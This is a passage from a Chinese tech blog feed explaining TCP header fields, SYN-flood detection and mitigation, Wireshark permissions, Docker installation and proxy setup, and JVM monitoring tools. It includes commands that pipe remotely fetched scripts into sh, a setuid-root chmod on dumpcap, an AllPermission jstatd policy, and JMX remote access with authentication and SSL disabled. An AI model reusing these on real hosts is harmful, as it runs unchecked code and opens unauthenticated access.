连接中传送的数据流中的每一个字节都编上一个序号。序号字段的值则指的是本报文段所发送的数据的第一个字节的序号。<ul><li>如果含有同步化旗标（SYN），则此为最初的序列号；第一个数据比特的序列码为本序列号加一。</li><li>如果没有同步化旗标（SYN），则此为第一个数据比特的序列码。</li></ul></li><li>Acknowledgment number，确认号（ack，32位长）—期望收到对方的下一个报文段的数据的第一个字节的序号。也即已经收到的数据的字节长度加1。</li><li>Header Length，报头长度（4位长）—以4字节为单位计算出的数据段开始地址的偏移值，即它指出报文数据距TCP报头的起始处有多远(TCP报文头长度)。</li><li>保留字段 6bits，保留今后使用，目前置0处理。</li><li>Flags，标志符，1bits<ul><li>URG：紧急比特—为1表示高优先级数据包，紧急指针字段有效。</li><li>ACK：确认比特—为1表示确认号字段有效。当 ACK=0 时，确认号无效</li><li>PSH：推送比特—为1表示是带有PUSH标志的数据，指示接收方应该尽快将这个报文段交给应用层而不用等待缓冲区装满。</li><li>RST：复位比特—为1表示出现严重差错，(如由于主机崩溃或其他原因)。可能需要重现创建TCP连接。还可以用于拒绝非法的报文段和拒绝连接请求。</li><li>SYN：同步比特—为1表示这是连接请求或是连接接受请求，用于创建连接和使顺序号同步。</li><li>FIN：终止比特—为1表示发送方没有数据要传输了，要求释放连接。</li></ul></li><li>Window size value，窗口（WIN，16位长）—表示从确认号开始，本报文的接受方可以接收的字节数，即接收窗口大小。用于流量控制。TCP 连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。</li><li>Checksum，校验和（Checksum，16位长）—对整个的TCP报文段，包括TCP头部和TCP数据，以16位字进行计算所得。这是一个强制性的字段。检验和字段检验的范围包括首部和数据这两部分。在计算检验和时，要在 TCP 报文段的前面加上 12 字节的伪首部。</li><li>Urgent pointer，紧急指针（16位长）—本报文段中的紧急数据的最后一个字节的序号。</li><li>选项字段—最多40字节。每个选项的开始是1字节的kind字段，说明选项的类型。<ul><li>0：选项表结束（1字节）</li><li>1：无操作（1字节）用于选项字段之间的字边界对齐。</li><li>2：最大报文段长度（4字节，Maximum Segment Size，MSS）通常在创建连接而设置SYN标志的数据包中指明这个选项，指明本端所能接收的最大长度的报文段。通常将MSS设置为（MTU-40）字节，携带TCP报文段的IP数据报的长度就不会超过MTU，从而避免本机发生IP分片。只能出现在同步报文段中，否则将被忽略。</li><li>3：窗口扩大因子（4字节，wscale），取值0-14。用来把TCP的窗口的值左移的位数。只能出现在同步报文段中，否则将被忽略。这是因为现在的TCP接收数据缓冲区（接收窗口）的长度通常大于65535字节。</li><li>4：sackOK—发送端支持并同意使用SACK选项。</li><li>5：SACK实际工作的选项。</li><li>8：时间戳（10字节，TCP Timestamps Option，TSopt）<ul><li>发送端的时间戳（Timestamp Value field，TSval，4字节）</li><li>时间戳回显应答（Timestamp Echo Reply field，TSecr，4字节）</li></ul></li></ul></li></ul></blockquote><p>TCP并不是对所有的应用都适合，一些新的带有一些内在的脆弱性的运输层协议也被设计出来。比如，实时应用并不需要甚至无法忍受TCP的可靠传输机制。在这种类型的应用中，通常允许一些丢包、出错或拥塞，而不是去校正它们。例如通常不使用TCP的应用有：<strong>实时流多媒体（如因特网广播）、实时多媒体播放器和游戏、IP电话（VoIP）</strong>等等。任何不是很需要可靠性或者是想将功能减到最少的应用可以避免使用TCP。在很多情况下，当只需要多路复用应用服务时，用户数据报协议（UDP）可以代替TCP为应用提供服务。</p><h3 id="如何检测-SYN-攻击"><a href="#如何检测-SYN-攻击" class="headerlink" title="如何检测 SYN 攻击"></a>如何检测 SYN 攻击</h3><p>检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。在Linux/Unix上可以使用系统自带的netstats命令来检测SYN攻击</p><h3 id="如何防御SYN攻击"><a href="#如何防御SYN攻击" class="headerlink" title="如何防御SYN攻击"></a>如何防御SYN攻击</h3><p>SYN攻击不能完全被阻止，除非将TCP协议重新设计。我们所做的是尽可能的减轻SYN攻击的危害，常见的防御 SYN 攻击的方法有如下几种：</p><blockquote><ul><li>缩短超时（SYN Timeout）时间</li><li>增加最大半连接数</li><li>过滤网关防护</li><li>SYN cookies技术</li></ul></blockquote><h3 id="给wireshark添加用户权限"><a href="#给wireshark添加用户权限" class="headerlink" title="给wireshark添加用户权限"></a>给wireshark添加用户权限</h3><p>问题：普通用户没有执行权限，也打不开网络端口捕捉，因为dumpcap需要root权限。<br>产生这种问题的原因：比如：wireshark在进行插件型添加的时候，正常情况下是需要在用户权限下才可以运行插件。可以参考wireshark中的/usr/share/wireshark/init.lua 文件中的disable_lua = false语句。<br>解决办法：为普通用户提供执行wireshark权限。</p><p>Limiting capture permission to only one group</p><p>After having set dumpcap’s network privileges:</p><ol><li><p>Create user “wireshark” in group “wireshark”.</p></li><li><p>chgrp wireshark /usr/sbin/dumpcap</p></li><li><p>chmod o-rx /usr/sbin/dumpcap</p></li><li><p>Ensure Wireshark works only from root and from a user in the “wireshark” group</p></li></ol><p>1、添加wireshark用户组</p><p>sudo groupadd wireshark</p><p>2、将dumpcap更改为wireshark用户组</p><p>sudo chgrp wireshark /usr/bin/dumpcap</p><p>3、让wireshark用户组有root权限使用dumpcap</p><p>sudo chmod 4755 /usr/bin/dumpcap</p><p>(注意:如果设为4754 Wireshark还是会提示没有权限 )</p><p>4、将需要使用的普通用户名加入wireshark用户组：</p><p>sudo gpasswd -a yourname wireshark</p><p>如此，可以以普通用户yourname登陆打开Wireshark抓包</p><p>这样一来，wireshark也就支持了在普通用户的插件型添加协议的功能。</p>]]></content>
    
    <summary type="html">
    
      TCP/IP通过三次握手建立一个连接。这一过程中的三种报文是：SYN，SYN/ACK，ACK。
    
    </summary>
    
    
    
      <category term="Wireshark" scheme="https://blog.yanzhe.tk/tags/wireshark/"/>
    
      <category term="TCP" scheme="https://blog.yanzhe.tk/tags/tcp/"/>
    
  </entry>
  
  <entry>
    <title>Docker设置socks5代理或使用国内镜像</title>
    <link href="https://blog.yanzhe.tk/2017/11/09/docker-set-proxy/"/>
    <id>https://blog.yanzhe.tk/2017/11/09/docker-set-proxy/</id>
    <published>2017-11-09T03:34:01.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<p>Dockers是有能力打包应用程式及其虚拟容器，可以在任何Linux伺服器上执行的依赖性工具，这有助於实现灵活性和便携性，应用程式在任何地方都可以执行，无论是公有云、私有云、单机等。<br><a href="https://www.docker.com/what-docker">docker是什么</a>.</p><h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><p>如果可以直接连接docker官网，可以直接使用以下命令安装。一条命令直接安装docker。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL http<span class="variable">s:</span>//<span class="built_in">get</span>.docker.<span class="keyword">com</span>/ | <span class="keyword">sh</span></span><br></pre></td></tr></table></figure><p>如果以上安装失败，可以下载脚本后 <a href="install_docker.sh">install_docker.sh</a> 执行<code>sh --mirror Aliyun</code><br>或</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wget http:<span class="regexp">//</span>blog.yanzhe.tk<span class="regexp">/2017/</span><span class="number">11</span><span class="regexp">/09/</span>docker-set-proxy<span class="regexp">/install_docker.sh | sh --mirror Aliyun</span></span><br></pre></td></tr></table></figure><p>如需要设置非root用户自启docker，需要将目标用户添加到docker分组，即是现在安装docker后会出现的提示</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><p>docker安装后出现Cannot connect to the Docker daemon.一般重启docker即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h2 id="Docker-设置http-https-socks5代理"><a href="#Docker-设置http-https-socks5代理" class="headerlink" title="Docker 设置http,https socks5代理"></a>Docker 设置http,https socks5代理</h2><ol><li>为docker服务创建一个内嵌的systemd目录</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure><ol start="2"><li>创建/etc/systemd/system/docker.service.d/https-proxy.conf文件，并添加HTTP_PROXY,或HTTPS_PROXY环境变量。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/systemd/system/docker.service.d</span><br><span class="line">sudo nano https-proxy.conf</span><br></pre></td></tr></table></figure><p>其中ip和port,NO_PROXY分别改成实际情况的代理地址和端口：<br>https-proxy.conf</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">Environment="HTTP_PROXY=socks5://127.0.0.1:1080/" "HTTPS_PROXY=socks5://127.0.0.1:1080/" "NO_PROXY=localhost,127.0.0.1,docker.io,yanzhe919.mirror.aliyuncs.com,99nkhzdo.mirror.aliyuncs.com,*.aliyuncs.com,*.mirror.aliyuncs.com,registry.docker-cn.com,hub.c.163.com,hub-auth.c.163.com,"</span><br></pre></td></tr></table></figure><ol start="3"><li>更新配置：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure><ol start="4"><li>重启Docker服务：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id="如使用国内镜像，可用"><a href="#如使用国内镜像，可用" class="headerlink" title="如使用国内镜像，可用"></a>如使用国内镜像，可用</h2><h3 id="docker-pull-完整路径-网址-name-repo-tag"><a href="#docker-pull-完整路径-网址-name-repo-tag" class="headerlink" title="docker pull 完整路径(网址/name/repo:tag)"></a>docker pull 完整路径(网址/name/repo:tag)</h3><p>您可以使用以下命令直接从该镜像加速地址进行拉取：</p><p><code>docker pull registry.docker-cn.com/myname/myrepo:mytag</code></p><p>例如:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.docker-cn.com/library/ubuntu:16.04</span><br></pre></td></tr></table></figure><h3 id="使用-–registry-mirror-配置-Docker-守护进程"><a href="#使用-–registry-mirror-配置-Docker-守护进程" class="headerlink" title="使用 –registry-mirror 配置 Docker 守护进程"></a>使用 –registry-mirror 配置 Docker 守护进程</h3><p>您可以配置 Docker 守护进程默认使用 Docker 官方镜像加速。这样您可以默认通过官方镜像加速拉取镜像，而无需在每次拉取时指定 <code>registry.docker-cn.com</code>。</p><p>您可以在 Docker 守护进程启动时传入 <code>--registry-mirror</code> 参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker --registry-mirror=https://registry.docker-cn.com daemon</span><br></pre></td></tr></table></figure><p>为了永久性保留更改，您可以修改 <code>/etc/docker/daemon.json</code> 文件并添加上 <code>registry-mirrors</code> 键值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  "registry-mirrors": ["https://registry.docker-cn.com"]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改保存后重启 Docker 以使配置生效。</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">systemctl daemon-reload</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">systemctl restart docker</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">systemctl enable docker</span></span><br></pre></td></tr></table></figure><p>阿里，使用需要登录自己的阿里账号，配置自己的地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /etc/docker</span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'</span><br><span class="line">&#123;</span><br><span class="line">  "registry-mirrors": ["https://99nkhzdo.mirror.aliyuncs.com"]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo systemctl enable docker</span><br></pre></td></tr></table></figure><h2 id="docker-基本使用示例"><a href="#docker-基本使用示例" class="headerlink" title="docker 基本使用示例"></a>docker 基本使用示例</h2><h3 id="docker-安装并运行nginx"><a href="#docker-安装并运行nginx" class="headerlink" title="docker 安装并运行nginx"></a>docker 安装并运行nginx</h3><blockquote><ul><li>检查本地镜像</li></ul></blockquote><pre><code>`docker images`</code></pre><blockquote><ul><li>拉取镜像</li></ul></blockquote><pre><code>`docker pull nginx` 或是使用dockerfile文件build images</code></pre><blockquote><ul><li>运行容器，可指定后台运行-d，指定映射端口-p 主机:容器内，指定挂载目录-v 主机:容器内</li></ul></blockquote><p>可COPY nginx默认配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/nginx/www ~/nginx/logs ~/nginx/conf</span><br><span class="line">cd ~/nginx</span><br><span class="line">docker run --name mynginx -d library/nginx</span><br><span class="line">docker cp mynginx:/etc/nginx/nginx.conf /home/yanzhe/nginx/conf/nginx.conf</span><br><span class="line">docker run -p 80:80 --name mynginx -v $PWD/www:/www -v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf -v $PWD/logs:/wwwlogs  -d nginx</span><br></pre></td></tr></table></figure><blockquote><ul><li>查看容器状态</li></ul></blockquote><pre><code>-a所有`docker ps -a`</code></pre><blockquote><ul><li>查看端口是否监听</li></ul></blockquote><pre><code>`ss -na | grep :80`或是`netstat -na | grep 80`</code></pre><blockquote><ul><li>查看容器日志</li></ul></blockquote><pre><code>`docker logs mynginx`</code></pre><blockquote><ul><li>进入容器</li></ul></blockquote><pre><code>`docker exec -it mynginx bash`</code></pre><blockquote><ul><li>访问web</li></ul></blockquote><pre><code>`http://localhost:80`</code></pre><blockquote><ul><li>停止容器</li></ul></blockquote><pre><code>`docker stop mynginx`</code></pre><blockquote><ul><li>启动/重启容器</li></ul></blockquote><pre><code>`docker start mynginx` `docker restart mynginx`</code></pre><blockquote><ul><li>删除容器</li></ul></blockquote><pre><code>`dockert rm mynginx`</code></pre><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h3 id="使用war包，tomcat"><a href="#使用war包，tomcat" class="headerlink" title="使用war包，tomcat"></a>使用war包，tomcat</h3><blockquote><ul><li>拉取tomcat</li></ul></blockquote><pre><code>`docker pull library/tomcat`</code></pre><blockquote><ul><li>使用dockerfile</li></ul></blockquote><p>将war包与dockerfile放置于同级目录，创建dockerfile</p><pre><code><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#from 基础镜像,images name</span></span></span><br><span class="line">from library/tomcat</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#制作者信息</span></span></span><br><span class="line">MAINTAINER yanzhe yz@gmail.com</span><br><span class="line"></span><br><span class="line">COPY jpress.war /usr/local/tomcat/webapps</span><br></pre></td></tr></table></figure></code></pre><blockquote><ul><li>build dockerfile</li></ul></blockquote><pre><code>-t 指定name:tag`docker build -t jpress:latest`</code></pre><blockquote><ul><li>运行容器</li></ul></blockquote><pre><code>`docker run -d -p 8888:8080 jpress`</code></pre><blockquote><ul><li>查看端口是否监听</li></ul></blockquote><pre><code>`ss -na | grep 8888`或是`netstat -na | grep 8888`</code></pre><blockquote><ul><li>访问tomcat</li></ul></blockquote><pre><code>`http://localhost:8888/jpress`</code></pre><h3 id="spring-boot"><a href="#spring-boot" class="headerlink" title="spring boot"></a>spring boot</h3><blockquote><ul><li>添加 Dockerfile</li></ul></blockquote><p>在应用根目录下建立 Dockerfile 文件，内容如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">FROM maven:3.3.3</span><br><span class="line"></span><br><span class="line">ADD pom.xml /tmp/build/</span><br><span class="line">RUN cd /tmp/build &amp;&amp; mvn -q dependency:resolve</span><br><span class="line"></span><br><span class="line">ADD src /tmp/build/src</span><br><span class="line">        #构建应用</span><br><span class="line">RUN cd /tmp/build &amp;&amp; mvn -q -DskipTests=true package \</span><br><span class="line">        #拷贝编译结果到指定目录</span><br><span class="line">        &amp;&amp; mv target/*.jar /app.jar \</span><br><span class="line">        #清理编译痕迹</span><br><span class="line">        &amp;&amp; cd / &amp;&amp; rm -rf /tmp/build</span><br><span class="line"></span><br><span class="line">VOLUME /tmp</span><br><span class="line">EXPOSE 8080</span><br><span class="line">ENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-jar","/app.jar"]</span><br></pre></td></tr></table></figure><p>由于项目使用 Maven 构建，故本次基础镜像选用 maven:3.3.3 官方镜像。<br>官方维护的 Maven 镜像依赖于 Java 镜像构建，所以我们不需要使用 Java 镜像。</p><p>因为 Spring Boot 框架打包的应用是一个包含依赖的 jar 文件，内嵌了 Tomcat 和 Jetty 支持，所以我们只需要使用包含 Java 的 Maven 镜像即可，不需要 Tomcat 镜像。</p><p>为了减少镜像大小，在执行 Maven 构建之后，清理了构建痕迹。</p><p>在 Dockerfile 文件的最后，使用 ENTRYPOINT 指令执行启动 Java 应用的操作。</p><blockquote><ul><li>构建docker镜像</li></ul></blockquote><pre><code>`docker build -t docker-demo-spring-boot . `</code></pre><blockquote><ul><li>从镜像启动容器</li></ul></blockquote><pre><code>`docker run -d -p 8080:8080 docker-demo-spring-boot`</code></pre><blockquote><ul><li>打开浏览器，或者使用 curl 访问如下地址</li></ul></blockquote><pre><code>`http://127.0.0.1:8080`</code></pre>]]></content>
    
    <summary type="html">
    
      创建目录`mkdir -p /etc/systemd/system/docker.service.d`,创建`https-proxy.conf`文件，并添加`HTTP_PROXY`,或`HTTPS_PROXY` `NO_PROXY`环境变量。更新配置`sudo systemctl daemon-reload`，重启Docker服务`sudo systemctl restart docker`。
    
    </summary>
    
    
      <category term="Docker" scheme="https://blog.yanzhe.tk/categories/docker/"/>
    
    
      <category term="Docker" scheme="https://blog.yanzhe.tk/tags/docker/"/>
    
      <category term="SS" scheme="https://blog.yanzhe.tk/tags/ss/"/>
    
      <category term="proxy" scheme="https://blog.yanzhe.tk/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>jdk 图表化工具jconsole jvisualvm 以及一些第三方工具</title>
    <link href="https://blog.yanzhe.tk/2017/11/03/jdk-jconsole-jvisualvm-and-3rdtools/"/>
    <id>https://blog.yanzhe.tk/2017/11/03/jdk-jconsole-jvisualvm-and-3rdtools/</id>
    <published>2017-11-03T01:45:13.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<p>工具做为图形化界面来展示更能直观的发现问题，另一方面一些耗费性能的分析（dump文件分析）一般也不会在生产直接分析，往往dump下来的文件达1G左右，人工分析效率较低，因此利用工具来分析jvm相关问题，长长可以到达事半功倍的效果来。</p><p>jvm监控分析工具一般分为两类，一种是jdk自带的工具，一种是第三方的分析工具。jdk自带工具一般在jdk bin目录下面，以exe的形式直接点击就可以使用，其中包含分析工具已经很强大，几乎涉及了方方面面，但是我们最常使用的只有两款：jconsole.exe和jvisualvm.exe；第三方的分析工具有很多，各自的侧重点不同，比较有代表性的：MAT(Memory Analyzer Tool)、GChisto等。</p><p>对于大型 JAVA 应用程序来说，再精细的测试也难以堵住所有的漏洞，即便我们在测试阶段进行了大量卓有成效的工作，很多问题还是会在生产环境下暴露出来，并且很难在测试环境中进行重现。JVM 能够记录下问题发生时系统的部分运行状态，并将其存储在堆转储 (Heap Dump) 文件中，从而为我们分析和诊断问题提供了重要的依据。其中VisualVM和MAT是dump文件的分析利器。</p><h2 id="jdk自带的工具"><a href="#jdk自带的工具" class="headerlink" title="jdk自带的工具"></a>jdk自带的工具</h2><h3 id="jconsole"><a href="#jconsole" class="headerlink" title="jconsole"></a>jconsole</h3><p>Jconsole（Java Monitoring and Management Console）是从java5开始，在JDK中自带的java监控和管理控制台，用于对JVM中内存，线程和类等的监控，是一个基于JMX（java management extensions）的GUI性能监测工具。jconsole使用jvm的扩展机制获取并展示虚拟机中运行的应用程序的性能和资源消耗等信息。</p><p>直接在jdk/bin目录下点击jconsole.exe即可启动.</p><p>在弹出的框中可以选择本机的监控本机的java应用，也可以选择远程的java服务来监控.</p><p>需要注意的就是在运行jconsole之前，必须要先设置环境变量DISPLAY，否则会报错误，Linux下设置环境变量如下：<br><code>export DISPLAY=:0.0</code></p><p>要从远程应用程序中检索数据，需要在远程 JVM 上运行 jstatd 实用程序。即要进行以下操作：</p><blockquote><p>(1)在jdk 安装目录的bin目录下新建文件jstatd.all.policy，文件内容为：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant codebase "file:$&#123;java.home&#125;/../lib/tools.jar" &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>(2)再新建文件jstatd.sh ，文件内容为：<br><code>./jstatd -J-Djava.security.policy=jstatd.all.policy</code></p></blockquote><blockquote><p>(3)启动jstat : nohup jstatd.sh &amp; (默认启动端口为1099)<br>(4)配置resin.conf，把以下注释打开：</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- no use args --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Xdebug<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>(5)在应用的resin配置文件中加配置：</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote.port=9009<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote.ssl=false<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jvm-arg</span>&gt;</span>-Dcom.sun.management.jmxremote.authenticate=false<span class="tag">&lt;/<span class="name">jvm-arg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果监控远程服务需要在tomcat启动脚本中添加如下代码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-Dcom.sun.management.jmxremote.port=6969  </span><br><span class="line">-Dcom.sun.management.jmxremote.ssl=false  </span><br><span class="line">-Dcom.sun.management.jmxremote.authenticate=false</span><br></pre></td></tr></table></figure><p>连接进去之后，就可以看到jconsole概览图和主要的功能：概述、内存、线程、类、VM、MBeans.</p><blockquote><ul><li>概述，以图表的方式显示出堆内存使用量，活动线程数，已加载的类，CUP占用率的折线图，可以非常清晰的观察在程序执行过程中的变动情况。</li><li>内存，主要展示了内存的使用情况，同时可以查看堆和非堆内存的变化值对比，也可以点击执行GC来处罚GC的执行</li><li>线程，主界面展示线程数的活动数和峰值，同时点击左下方线程可以查看线程的详细信息，比如线程的状态是什么，堆栈内容等，同时也可以点击“检测死锁”来检查线程之间是否有死锁的情况。</li><li>类，主要展示已加载类的相关信息。</li><li>VM 概要，展示JVM所有信息总览，包括基本信息、线程相关、堆相关、操作系统、VM参数等。</li><li>Mbean,查看Mbean的属性，方法等。</li></ul></blockquote><h3 id="VisualVM"><a href="#VisualVM" class="headerlink" title="VisualVM"></a>VisualVM</h3><p>VisualVM 是一个工具，它提供了一个可视界面，用于查看 Java 虚拟机 (Java Virtual Machine, JVM) 上运行的基于 Java 技术的应用程序（Java 应用程序）的详细信息。VisualVM 对 Java Development Kit (JDK) 工具所检索的 JVM 软件相关数据进行组织，并通过一种使您可以快速查看有关多个 Java 应用程序的数据的方式提供该信息。您可以查看本地应用程序以及远程主机上运行的应用程序的相关数据。此外，还可以捕获有关 JVM 软件实例的数据，并将该数据保存到本地系统，以供后期查看或与其他用户共享。</p><p>VisualVM 是javajdk自带的最牛逼的调优工具了吧，也是我平时使用最多调优工具，几乎涉及了jvm调优的方方面面。同样是在jdk/bin目录下面双击jvisualvm.exe既可使用，启动起来后和jconsole 一样同样可以选择本地和远程，如果需要监控远程同样需要配置相关参数.</p><p>VisualVM可以根据需要安装不同的插件，每个插件的关注点都不同，有的主要监控GC，有的主要监控内存，有的监控线程等。</p><p>如何安装：</p><blockquote><p>1、从主菜单中选择“工具”&gt;“插件”。<br>2、在“可用插件”标签中，选中该插件的“安装”复选框。单击“安装”。<br>3、逐步完成插件安装程序。</p></blockquote><p>监控的主页其实也就是，cpu、内存、类、线程的图表<br>线程和jconsole功能没有太大的区别<br>Visual GC 是常常使用的一个功能，可以明显的看到年轻代、老年代的内存变化，以及gc频率、gc的时间等。<br>以上的功能其实jconsole几乎也有，VisualVM更全面更直观一些，另外VisualVM非常多的其它功能，可以分析dump的内存快照，dump出来的线程快照并且进行分析等，还有其它很多的插件大家可以去探索</p><p><a href="http://zhouanya.blog.51cto.com/4944792/1370017">Jvisualvm配置使用</a></p><h2 id="第三方调优工具"><a href="#第三方调优工具" class="headerlink" title="第三方调优工具"></a>第三方调优工具</h2><h3 id="MAT"><a href="#MAT" class="headerlink" title="MAT"></a>MAT</h3><p>MAT(Memory Analyzer Tool)，一个基于Eclipse的内存分析工具，是一个快速、功能丰富的Java heap分析工具，它可以帮助我们查找内存泄漏和减少内存消耗。使用内存分析工具从众多的对象中进行分析，快速的计算出在内存中对象的占用大小，看看是谁阻止了垃圾收集器的回收工作，并可以通过报表直观的查看到可能造成这种结果的对象。</p><p>通常内存泄露分析被认为是一件很有难度的工作，一般由团队中的资深人士进行。不过要介绍的 MAT（Eclipse Memory Analyzer）被认为是一个“傻瓜式“的堆转储文件分析工具，你只需要轻轻点击一下鼠标就可以生成一个专业的分析报告。和其他内存泄露分析工具相比，MAT 的使用非常容易，基本可以实现一键到位，即使是新手也能够很快上手使用。</p><p>MAT以eclipse 插件的形式来安装，具体的安装过程就不在描述了，可以利用visualvm或者是 jmap命令生产堆文件，导入eclipse mat中生成分析报告</p><p>生产这会报表的同时也会在dump文件的同级目录下生成三份（dump_Top_Consumers.zip、dump_Leak_Suspects.zip、dump_Top_Components.zip）分析结果的html文件，方便发送给相关同事来查看。</p><p>需要关注的是下面的Actions、Reports、Step by Step区域：</p><blockquote><ul><li>Histogram：列出内存中的对象，对象的个数以及大小，支持正则表达式查找，也可以计算出该类所有对象的retained size.</li><li>Dominator Tree：列出最大的对象以及其依赖存活的Object （大小是以Retained Heap为标准排序的）</li><li>Top Consumers ： 通过图形列出最大的object</li><li>duplicate classes ：检测由多个类装载器加载的类</li><li>Leak Suspects ：内存泄漏分析</li><li>Top Components: 列出大于总堆数的百分之1的报表。</li><li>Component Report:分析对象属于同一个包或者被同一个类加载器加载</li></ul></blockquote><p>以上只是一个初级的介绍，mat还有更强大的使用，比如对比堆内存，在生产环境中往往为了定位问题，每隔几分钟dump出一下内存快照，随后在对比不同时间的堆内存的变化来发现问题。</p><h3 id="GChisto"><a href="#GChisto" class="headerlink" title="GChisto"></a>GChisto</h3><p>GChisto是一款专业分析gc日志的工具，可以通过gc日志来分析：Minor GC、full gc的时间、频率等等，通过列表、报表、图表等不同的形式来反应gc的情况。虽然界面略显粗糙，但是功能还是不错的。</p><p>配置好本地的jdk环境之后，双击GChisto.jar,在弹出的输入框中点击 add 选择gc.log日志</p><blockquote><ul><li>GC Pause Stats:可以查看GC 